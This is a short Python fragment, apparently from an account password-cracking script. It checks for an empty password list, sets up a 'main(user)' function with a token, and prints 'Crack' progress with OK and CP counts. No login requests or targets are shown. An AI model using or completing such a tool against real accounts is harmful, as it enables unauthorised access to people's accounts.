	if len(pw) ==0:
		exit(" \033[0;97m[\033[0;91m!\033[0;97m] Don't Be Empty")
	
	def main(user):
		global loop, token
		#sys.stdout.write('\r \033[0;97m[\033[0;93m*\033[0;97m] Crack %s/OK:%s CP:%s ' % (loop, len(ok), len(cp))
